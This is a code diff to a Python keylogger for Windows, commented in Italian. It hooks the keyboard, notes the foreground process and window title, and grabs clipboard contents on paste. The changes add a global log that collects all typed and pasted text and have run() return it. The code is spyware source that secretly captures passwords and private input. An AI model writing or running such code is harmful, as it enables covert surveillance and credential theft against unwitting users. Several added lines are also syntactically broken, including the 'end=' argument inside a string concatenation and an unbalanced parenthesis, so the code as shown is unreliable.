@@ -26,9 +26,13 @@ psapi    = windll.psapi
 # inizialmente non avremo selezionatto nessuna finestra
 current_window = None
 
+# variabile da restituire
+log = str()
+
 # serve a capire su che processo vengono inseriti i dati catturati
 def get_current_process():
-
+    # globale dove loggare
+    global log
     # gestore della finestra su cui si lavora
     hwnd = user32.GetForegroundWindow()
 
@@ -60,12 +64,16 @@ def get_current_process():
     print ("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
     print
 
+    log += '\n[ PID: %s - %s - %s ]\n' % (process_id, executable.value, window_title.value))
+
     # chiudiamo gli handler
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
 # funzione che gestisce la pressione dei tasti e il copia e incolla
 def KeyStroke(event):
+    # globale dove loggare
+    global log
     # prendiamo il valore da globale: a inizio esecuzione e' None
     global current_window
     
@@ -77,6 +85,7 @@ def KeyStroke(event):
     # se e' stato premuto un caratte standard lo stampiamo
     if event.Ascii > 32 and event.Ascii < 127:
         print (chr(event.Ascii), end='')
+        log += (chr(event.Ascii), end='')
     else:
         # se [Ctrl-V], recupera il valore dagli appunti del sistema
         if event.Key == "V":
@@ -88,8 +97,10 @@ def KeyStroke(event):
             win32clipboard.CloseClipboard()
             # li stampa
             print ("[PASTE] - %s" % (pasted_value),)
+            log += ("[PASTE] - %s" % (pasted_value),)
         else:
             print ("[%s]" % event.Key,)
+            log += ("[%s]" % event.Key,)
 
     # passa l'esecuzione al successivi 'hook' registrato
     return True
@@ -120,7 +131,7 @@ def run():
     
     # usciamo
     print ('[*] Exiting...')
-    return
-    #sys.exit()
+    return str(log)
+
     
 
